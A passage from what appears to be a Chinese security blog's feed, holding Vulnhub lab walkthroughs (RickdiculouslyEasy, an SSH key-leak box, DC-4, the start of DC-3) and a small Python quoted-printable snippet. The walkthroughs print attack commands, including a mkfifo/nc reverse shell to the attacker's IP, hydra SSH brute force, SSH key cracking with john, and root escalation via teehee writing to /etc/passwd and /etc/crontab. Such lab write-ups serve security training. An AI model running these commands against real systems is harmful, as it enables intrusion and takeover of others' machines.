        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/">https://www.vulnhub.com/entry/rickdiculouslyeasy-1,207/</a></p><blockquote><p>KALI地址：192.168.10.70</p><p>靶机地址：192.168.10.71</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下，来进行主机发现。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.10.70<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，进行了主机发现，发现了靶机IP地址</p><p><img src="/images/wordimage/2022/0414/net.png"></p><hr><h3 id="2-主机扫描-第一个flag"><a href="#2-主机扫描-第一个flag" class="headerlink" title="2.主机扫描-第一个flag"></a>2.主机扫描-第一个flag</h3><p>使用工具nmap进行扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.10.71<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果，如下，发现开放了一堆端口，分别是<code>21</code>,<code>22</code>,<code>80</code>,<code>9090</code>,<code>13337</code>,<code>22222</code>端口，其中在里面发现了一个flag</p><p><img src="/images/wordimage/2022/0414/nmap-flag1.png" alt="第一个flag"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了80端口，肯定少不了目录扫描，所以对80端口进行目录扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.10.71<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果，如下，发现了几个敏感目录</p><p><img src="/images/wordimage/2022/0414/dirb.png"></p><p>并且经过上面主机扫描，发现<code>9090</code>端口也开放了http服务，所以我们也对9090端口进行目录扫描，命令和上面差不多，IP地址后面带端口即可，扫描结果如下，并没有发现什么可以利用的地方。</p><p><img src="/images/wordimage/2022/0414/dirb2.png"></p><hr><h3 id="4-网页信息收集-第二个flag。"><a href="#4-网页信息收集-第二个flag。" class="headerlink" title="4.网页信息收集-第二个flag。"></a>4.网页信息收集-第二个flag。</h3><p>上面信息收集发现开放了很多，端口，我们先去查看80端口到底有些什么东西，我们直接打开浏览器访问即可，如下图搜集信息。</p><p><img src="/images/wordimage/2022/0414/morty.png"></p><p>经过一番收集，并没有发现可以利用的地方，比如看源代码之类的。。。</p><p>然后9090也开放了web服务所以我们在IP地址后面加端口试试，如下图，加上了端口，并且发现了第二个flag，也对第二个flag进行了简单的探索也没有发现什么可以利用的地方。</p><p><img src="/images/wordimage/2022/0414/flag2.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-命令执行漏洞"><a href="#1-命令执行漏洞" class="headerlink" title="1.命令执行漏洞"></a>1.命令执行漏洞</h3><p>经过上面信息收集，目录扫描，我们发现有<code>robots.txt</code>文件，访问如下图，发现有三个目录，经过测试发现就<code>/cgi-bin/tracertool.cgi</code>目录可以利用。</p><p><img src="/images/wordimage/2022/0414/robots.png"></p><p>如下图访问<code>/cgi-bin/tracertool.cgi</code>内容，发现是实现ping命令的窗口，也可以执行命令执行，经过测试，管道符可以替换成<code>;</code>，如下图，的确是有命令执行漏洞。</p><p><img src="/images/wordimage/2022/0414/code.png"></p><p>所以我们可以初步查看敏感内容，比如<code>/etc/passwd</code>之类的，但是经过测试发现<code>cat</code>命令不能用，但是可以使用<code>more</code>命令查看，如下图，发现了几个重要用户，分别是<code>RickSanchez</code>,<code>Morty</code>,<code>Summer</code>。</p><p><img src="/images/wordimage/2022/0414/users.png"></p><p>当然中间还尝试过，使用wget命令来下载我们制作好的webshell，是失败的，猜测是没有wget下载权限。</p><hr><h3 id="2-信息泄露-第三个flag"><a href="#2-信息泄露-第三个flag" class="headerlink" title="2.信息泄露-第三个flag"></a>2.信息泄露-第三个flag</h3><p>经过上面，信息收集，我们还发现有一个<code>passwords</code>目录，访问如下，并且发现了第三个flag。</p><p><img src="/images/wordimage/2022/0414/FLAG3.png"></p><p><img src="/images/wordimage/2022/0414/flag3-2.png"></p><p>回过头来，发现了<code>passwords.html</code>这个文件，如下图。</p><p><img src="/images/wordimage/2022/0414/passwords_html.png"></p><p>我们查看源代码，如下图，发现了敏感信息密码，猜测是SSH连接密码。</p><p><img src="/images/wordimage/2022/0414/winter.png"></p><hr><h4 id="2-1用户信息泄露-第四个flag"><a href="#2-1用户信息泄露-第四个flag" class="headerlink" title="2.1用户信息泄露-第四个flag"></a>2.1用户信息泄露-第四个flag</h4><p>经过尝试，发现22端口不能连接，上面信息收集发现<code>22222</code>端口才是真正的SSH连接端口，经过尝试，Summer用户可以连接，连接命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> Summer@192.168.10.71 -p <span class="token number">22222</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，连接成功，然后我们查看第四个flag，当然使用cat命令不能查看， 所以使用more命令。</p><p><img src="/images/wordimage/2022/0414/flag4.png"></p><hr><h3 id="3-用户目录信息泄露-第五个flag"><a href="#3-用户目录信息泄露-第五个flag" class="headerlink" title="3.用户目录信息泄露-第五个flag"></a>3.用户目录信息泄露-第五个flag</h3><p>其实最开始我想要提权的，但是经过一番尝试好像不行，所以我们就可以先去看看home目录下面有什么东西，如下图，发现其他两个用户的文件。</p><p><img src="/images/wordimage/2022/0414/home.png"></p><p>我们先查看Morty用户的文件，发现了一个压缩包和一个图片，如下图。</p><p><img src="/images/wordimage/2022/0414/pngandzip.png"></p><p>这里我的想法是，把这些东西复制到网页目录下面，然后下载进行查看，但是经过尝试不行，没有权限，所以这里想的是另外一种方法，利用python开启简单的http服务，命令如下，在当前目录下面开启http服务，然后下载文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python -m SimpleHTTPServer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，端口是8000（默认8000）开启了简单的http服务。</p><p><img src="/images/wordimage/2022/0414/httpserver.png"></p><p>开启成功，之后我们直接访问靶机IP地址，下载对应文件即可，如下图。</p><p><img src="/images/wordimage/2022/0414/dirser.png"></p><p>下载完毕，一个压缩包一张图片，打开压缩包，发现呗加密了，打不开，感觉是伪加密，但是经过一番尝试发现不是伪加密，所以我们对图片下手，我们使用010EDIT打开图片，发现了重要信息，如下图，发现了压缩包密码是<code>Meeseek</code></p><p><img src="/images/wordimage/2022/0414/Meeseek.png"></p><p>然后打开解压后的文件，发现了第五个flag，如下图。</p><p><img src="/images/wordimage/2022/0414/flag5.png"></p><hr><h3 id="4-vsftpd的匿名登录-第六个flag"><a href="#4-vsftpd的匿名登录-第六个flag" class="headerlink" title="4.vsftpd的匿名登录-第六个flag"></a>4.vsftpd的匿名登录-第六个flag</h3><p>经过上面信息收集，我们发现了开放了vsftpd端口，猜测开放了匿名登录端口，如下图，使用匿名用户<code>anonymous</code>登录，可以登录。</p><p><img src="/images/wordimage/2022/0414/anonymous.png"></p><p>我们直接ls查看文件，发现了第六个flag，如下图。</p><p><img src="/images/wordimage/2022/0414/flag6.png"></p><p>这里我们使用get命令下载文件，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get FLAG.txtget pub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后我们查看第六个flag，当然，pub也查看了发现为空。</p><p><img src="/images/wordimage/2022/0414/flag6-2.png"></p><hr><h3 id="5-nc命令-第七个flag"><a href="#5-nc命令-第七个flag" class="headerlink" title="5.nc命令-第七个flag"></a>5.nc命令-第七个flag</h3><p>到了这里，发现就只有一个<code>60000</code>端口没有利用了，问了大佬，才发现是需要用nc命令来进行反弹，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">192.168</span>.10.71 <span class="token number">60000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，获取到了一个终端，并且里面有flag可以直接使用cat命令，进行查看。</p><p><img src="/images/wordimage/2022/0414/flag7.png"></p><hr><h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h2><p>需要多注意点，看见有奇怪的网页信息，都记得看源代码，说不定重要信息就在里面，然后需要了解各种敏感信息，和各种软件漏洞信息。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH-私钥泄露</title>
      <link href="/2022/04bcba730c.html"/>
      <url>/2022/04bcba730c.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机的网盘下载地址</p><blockquote><p>链接:<a href="https://pan.baidu.com/s/1NXO_oDqHxd0WaIG5Tqf8gw?pwd=w5qd">https://pan.baidu.com/s/1NXO_oDqHxd0WaIG5Tqf8gw?pwd=w5qd</a> 提取码: w5qd 复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><blockquote><p>KALI地址：192.168.10.60</p><p>靶机地址：192.168.10.56</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令，如下来进行主机发现。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.10.60<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们发现了靶机地址。</p><p><img src="/images/wordimage/2022/0412/netdis.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这里使用nmap工具来进行主机扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.10.56<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图扫描，结果，发现开放了<code>80</code>,<code>22</code>,<code>31337</code>端口，并且发现<code>31337</code>端口也是http服务</p><p><img src="/images/wordimage/2022/0412/port.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了web服务端口，那我们肯定要进行web目录扫描，命令如下，由于开放了两个web服务，就可以进行两次web服务扫描。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.10.56<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，是80端口的目录扫描，发现什么都没有</p><p><img src="/images/wordimage/2022/0412/dirb80.png"></p><p>我们可以进行对<code>31337</code>端口进行扫描，命令和上面差不多，后面加一个端口就可以了，扫描结果如下，发现有东西，一个是<code>.ssh</code>文件看名字值得注意还有一个是<code>robots</code>文件</p><p><img src="/images/wordimage/2022/0412/robots.png"></p><hr><h3 id="3-网页信息收集"><a href="#3-网页信息收集" class="headerlink" title="3.网页信息收集"></a>3.网页信息收集</h3><p>既然开放了web服务，我们肯定要进行查看，因为有很多信息都是从网页目录收集。</p><p>如下图，是访问的80端口，发现是nginx默认页面，经过收集没有什么可以发现的。</p><p><img src="/images/wordimage/2022/0412/nginx.png"></p><p>如下图是访问的31337端口，发现啥也没有。</p><p><img src="/images/wordimage/2022/0412/NotFound.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-私钥泄露"><a href="#1-私钥泄露" class="headerlink" title="1.私钥泄露"></a>1.私钥泄露</h3><h4 id="1-1-发现第一个flag"><a href="#1-1-发现第一个flag" class="headerlink" title="1.1.发现第一个flag"></a>1.1.发现第一个flag</h4><p>经过上面信息收集，我们发现了robots文件，和.ssh文件，我们先查看robots文件，如下图，发现有几个文件，看这个样子，我第一反应是去看<code>taxes</code>这个目录，因为，这个文件不常见。</p><p><img src="/images/wordimage/2022/0412/taxes.png"></p><p>如下图，查看<code>taxes</code>，发现了第一个flag。</p><p><img src="/images/wordimage/2022/0412/flag1.png"></p><p>然后其他两个文件也查看了，没有什么发现。</p><hr><h4 id="1-2-发现私钥泄露文件"><a href="#1-2-发现私钥泄露文件" class="headerlink" title="1.2.发现私钥泄露文件"></a>1.2.发现私钥泄露文件</h4><p>我们在去查看，上面我们信息收集收集到的<code>.ssh</code>目录，如下图，看这个名字就知道了，怀疑的是，.ssh目录下面有这三个文件，我们挨个访问看看。</p><p><img src="/images/wordimage/2022/0412/id_rsa.png"></p><p>经过测试，发现是可以进行下载的，并且是ssh密钥文件，然后复制到了kali。</p><p>但是打开<code>id_rsa</code>的时候发现需要密码。</p><p><img src="/images/wordimage/2022/0412/id_rsapass.png"></p><p>然后，我们打开其他文件，发现了用户名泄露，如下图，用户名是<code>simon</code>。</p><p><img src="/images/wordimage/2022/0412/simon.png"></p><p>然后上面<code>id_rsa</code>文件，需要进行破解。</p><h4 id="1-3-破解id-rsa文件"><a href="#1-3-破解id-rsa文件" class="headerlink" title="1.3.破解id_rsa文件"></a>1.3.破解id_rsa文件</h4><p>这里使用<code>ssh2john</code>工具进行破解，但是新版kali没有，其实是有的文件在<code>/usr/share/john/ssh2john.py</code>，我们直接使用python运行即可，如下命令，把破解之后的东西放在了rsacrack里面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python /usr/share/john/ssh2john.py id_rsa <span class="token operator">></span> rsacrack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图是文件内容，还需要在破解一次。</p><p><img src="/images/wordimage/2022/0412/rsacrack.png"></p><p>这里使用<code>john</code>工具来进行破解，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john rsacrack<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现破解出来一个密码，我破解的时候没有解图，我就直接查看了，密码是<code>starwars</code></p><p><img src="/images/wordimage/2022/0412/starwars.png"></p><p>破解出来了我以为是打开输入密码，其实不是，其实是咋子连接的时候的密码，说一个踩的坑，不能给<code>id_rsa</code>这个文件赋777权限，不然会报错，就是说777权限太开放了，然后我就重新赋了一个600权限，就可以了。</p><p>然后我们就可以尝试连接，用户名是simon，然后私钥密码，是<code>starwars</code>，命令如下,前提是先要赋权限600命令是<code>chmod 600 id_rsa</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i id_rsa simon@192.168.10.56<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，连接成功。</p><p><img src="/images/wordimage/2022/0412/simonsucc.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>我们进入系统之后，首先查看的是<code>/etc/passwd</code>和<code>home</code>目录下面的文件，但是都没有发现可以利用的点，但是我们可以进入root目录，里面有一个flag,我们打不开，如下图。</p><p><img src="/images/wordimage/2022/0412/rootflag.png"></p><h3 id="1-发现第二个flag"><a href="#1-发现第二个flag" class="headerlink" title="1.发现第二个flag"></a>1.发现第二个flag</h3><p>但是里面有一个其他文件<code>read_message.c</code>意思就是读取信息嘛，那我们cat一下看看，就发现了第二个flag如下图。</p><p><img src="/images/wordimage/2022/0412/flag2.png"></p><p>我们仔细阅读源代码，就是问我们是不是Simon，但是里面有一个<code>char buf[20]</code>，这个可以栈溢出，只需要大于20个字符就可以提权了。</p><p>所以我们直接运行这个C文件，然后大于20个字符即可，如下图，我们就提权成功了，就可以查看最后一个flag。</p><p><img src="/images/wordimage/2022/0412/root.png"></p><h3 id="2-发现第三个flag"><a href="#2-发现第三个flag" class="headerlink" title="2.发现第三个flag"></a>2.发现第三个flag</h3><p>如下图，最后一个flag。</p><p><img src="/images/wordimage/2022/0412/flag3.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>需要多注意隐藏目录，和不放过任何一个隐藏目录，看见密钥需要会连接，也需要学会使用john工具。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyton对Quoted-printable进行编码和解码</title>
      <link href="/2022/044175a078.html"/>
      <url>/2022/044175a078.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>利用的是python的<code>quopri</code>模块进行操作</p><hr><h2 id="一-加密"><a href="#一-加密" class="headerlink" title="一.加密"></a>一.加密</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> quopri<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"你好世界"</span>a <span class="token operator">=</span> quopri<span class="token punctuation">.</span>encodestring<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="二-解密"><a href="#二-解密" class="headerlink" title="二.解密"></a>二.解密</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> quopri<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6"</span>a <span class="token operator">=</span> quopri<span class="token punctuation">.</span>decodestring<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> Python </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-4靶机实战</title>
      <link href="/2022/04f353168e.html"/>
      <url>/2022/04f353168e.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></p><blockquote><p>KALI地址：192.168.75.108</p><p>靶机地址：192.168.75.207</p></blockquote><hr><h2 id="一-信息发现"><a href="#一-信息发现" class="headerlink" title="一.信息发现"></a>一.信息发现</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.75.108<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，发现了我们靶机的地址。</p><p><img src="/images/wordimage/2022/0407/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>这里使用nmap工具进行扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -O -p <span class="token number">0</span>-65535 <span class="token number">192.168</span>.75.207<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下，发现开放了<code>80</code>,<code>22</code>号端口。</p><p><img src="/images/wordimage/2022/0407/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>既然开放了80端口，那么我们就可以二话不说直接开始目录扫描，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.75.207<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下图，发现并没有什么可以利用的点。</p><p><img src="/images/wordimage/2022/0407/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>既然开放了，80端口，我们可以直接去访问，如下图，打开首页发现是一个登录框，我们可以尝试登录，随后又抽卡了源代码，网络信息，均没有发现可以利用的点。</p><p><img src="/images/wordimage/2022/0407/login.png"></p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><p>经过上面信息收集，发现了首页是可以登录的，并且没有验证码，试过了SQL注入，不行，尝试弱密码爆破。</p><p>爆破结果如下，发现密码可能是happy。</p><p><img src="/images/wordimage/2022/0407/happy.png"></p><p>经过测试发现就是happy，如下图，并且成功登录进去。</p><h3 id="1-命令执行"><a href="#1-命令执行" class="headerlink" title="1.命令执行"></a>1.命令执行</h3><p><img src="/images/wordimage/2022/0407/adminpass.png"></p><p>经过发现，发现可以执行命令，如下图，想法是是否可以尝试绕过，执行其他命令。</p><p><img src="/images/wordimage/2022/0407/order.png"></p><p>这里就可以使用bp进行抓包，然后进行绕过，如下图</p><p><img src="/images/wordimage/2022/0407/radio.png"></p><p>下面是输出结果，如下图。</p><p><img src="/images/wordimage/2022/0407/radio2.png"></p><p>所以我们就有了思路，一个思路是，让靶机下载我们的webshell，然后我们连接，第二个思路是反弹shell。</p><hr><h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><p>简单的说一下第一种思路，经过测试，发现靶机没有wget的下载权限，就放弃了，直接来到第二个思路也就是反弹shell的思路。</p><p>这里在靶机使用的命令是<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 192.168.75.108 6666 &gt; /tmp/f;</code>，</p><p>然后在kali里面使用nc命令来进行监听，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lnvp <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图效果开始监听。</p><p><img src="/images/wordimage/2022/0407/nc.png"></p><p>这里说一下历程，按照正常来说，像如下图一样发包就可以直接反弹成功了，但是发送了，就是没有反弹，看了大佬的博客才知道不能这样发包。</p><p><img src="/images/wordimage/2022/0407/ncfantan.png"></p><p>所以我们需要在前端修改代码，才能成功反弹，如下图查看源代码修改即可,然后点击run运行就可以直接成功反弹shell了。</p><p><img src="/images/wordimage/2022/0407/run.png"></p><p>如下图，KALI成功接收反弹。</p><p><img src="/images/wordimage/2022/0407/shell.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><h3 id="1-获取jim账户密码"><a href="#1-获取jim账户密码" class="headerlink" title="1.获取jim账户密码"></a>1.获取jim账户密码</h3><p>先按照如下图操作，先查看自己是什么用户和ID，然后使用python更换终端。</p><p><img src="/images/wordimage/2022/0407/id.png"></p><p>然后我们可以查看<code>/etc/passwd</code>下面的用户，如下图，发现了，三个用户，一个是<code>jim</code>，一个是<code>charles</code>,一个是<code>sam</code>。</p><p><img src="/images/wordimage/2022/0407/jim.png"></p><p>然后经过查找，发现在home目录下面发现了几个人的目录路径，如下图。</p><p><img src="/images/wordimage/2022/0407/home.png"></p><p>经过测试发现，在jim目录下面，发现了老密码的字样，我们直接打开看。</p><p><img src="/images/wordimage/2022/0407/oldpassword.png"></p><p>如下图，打开全是密码，这里的思路，这么多密码，肯定要试试暴力破解了，这里我们把密码复制进去文本</p><p><img src="/images/wordimage/2022/0407/password.png"></p><p>我们这里使用<code>hydra</code>工具来进行暴力破解ssh，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -l jim -P pass.txt -s <span class="token number">22</span> ssh://192.168.75.207 -vV-l <span class="token comment">#对应的是一个用户，如果是大写的-L就是用户本</span>-P <span class="token comment">#对应的是一个密码本，如果是小p那么就是一个密码</span>-s <span class="token comment">#对应的是端口</span>-vV <span class="token comment">#显示破解过程</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如下图破解成功，成功发现jim的密码。</p><blockquote><p>账户：jim</p><p>密码：jibril04</p></blockquote><p><img src="/images/wordimage/2022/0407/jibril04.png"></p><p>但是经过测试发现jim这个账户啥也不能干啊。</p><hr><h3 id="2-获取Charles账户密码"><a href="#2-获取Charles账户密码" class="headerlink" title="2.获取Charles账户密码"></a>2.获取Charles账户密码</h3><p>经过一番查找在<code>/var/mail</code>下面发现了一封邮件，邮件内容如下图，发现是密码。</p><p><img src="/images/wordimage/2022/0407/charles.png"></p><p>我们可以尝试登录一下查看，如下图，发现可以登录，然后我们查看是否有sudo权限，我们直接使用如下命令查看。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现有teeche的命令执行权限，如下图。</p><p><img src="/images/wordimage/2022/0407/teehee.png"></p><hr><h3 id="3-执行提权操作"><a href="#3-执行提权操作" class="headerlink" title="3.执行提权操作"></a>3.执行提权操作</h3><p>因为不熟悉teehee的提权方式，所以不怎么熟悉，就查了一下资料，这里有两种方法可以提权，第一种就是在<code>/etc/passwd</code>下面添加用户</p><p>第二种方法就是在linux的自动任务执行里面进行利用。</p><hr><h4 id="1-在-etc-passwd添加用户"><a href="#1-在-etc-passwd添加用户" class="headerlink" title="1.在/etc/passwd添加用户"></a>1.在/etc/passwd添加用户</h4><p>首先需要执行一个命令<code>perl -le &#39;print crypt(&quot;123456&quot;, &quot;ken&quot;)</code>，如下图。</p><p><img src="/images/wordimage/2022/0407/kenpass.png"></p><p>然后就可以执行一个命令来进行添加用户，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"takagisan:keNdbTFs2CPY6:0:0:::/bin/bash"</span> <span class="token operator">|</span> <span class="token function">sudo</span> teehee -a /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后如下图，报错失败，查了一下资料之后，发现需要第一次登录root用户在退出来就可以了，所以我这里直接换其他的提权方式了。</p><p><img src="/images/wordimage/2022/0407/faile.png"></p><hr><h4 id="2-创建定时任务给提权"><a href="#2-创建定时任务给提权" class="headerlink" title="2.创建定时任务给提权"></a>2.创建定时任务给提权</h4><p>看了一下大佬的博客，发现是这样的，创建一个定时人物然后给<code>/bin/sh</code>赋予SUID的权限，然后用teehee命令这个定时任务，写到/etc/crontab里面去。</p><p>命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"* * * * * root chmod 4777 /bin/sh"</span> <span class="token operator">|</span> <span class="token function">sudo</span> teehee -a /etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>crontab命令详解可以百度查资料。</p><p>这样之后我们就可以直接在控制台里面输入<code>/bin/sh</code>就可以了，如下图提权成功。</p><p><img src="/images/wordimage/2022/0407/root.png"></p><p>然后我们就可以去查看flag了，如下图，在root目录发现flag。</p><p><img src="/images/wordimage/2022/0407/flag.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>需要注意查看var下面的mail邮件目录，然后提权需要注意teehee提权方式，还需要多注意查看各种敏感目录，和文件。</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-3靶机实战</title>
      <link href="/2022/038e2010d6.html"/>
      <url>/2022/038e2010d6.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/dc-32,312/">https://www.vulnhub.com/entry/dc-32,312/</a></p><blockquote><p>KALI地址：192.168.1.18</p><p>靶机地址：192.168.1.35</p></blockquote><p>靶机描述如下</p><p>Description</p><p>DESCRIPTION</p><p>DC-3 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.</p><p>As with the previous DC releases, this one is designed with beginners in mind, although this time around, there is only one flag, one entry point and no clues at all.</p><p>Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</p><p>For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won’t give you the answer, instead, I’ll give you an idea about how to move forward.</p><p>For those with experience doing CTF and Boot2Root challenges, this probably won’t take you long at all (in fact, it could take you less than 20 minutes easily).</p><p>If that’s the case, and if you want it to be a bit more of a challenge, you can always redo the challenge and explore other ways of gaining root and obtaining the flag.</p><p>TECHNICAL INFORMATION</p><p>DC-3 is a VirtualBox VM built on Ubuntu 32 bit, so there should be no issues running it on most PCs.</p><p>Please note: There was an issue reported with DC-3 not working with VMware Workstation. To get around that, I recommend using VirtualBox, however, I have created a separate DC-3 VMware edition for those who can only use VMware.</p><p>It is currently configured for Bridged Networking, however, this can be changed to suit your 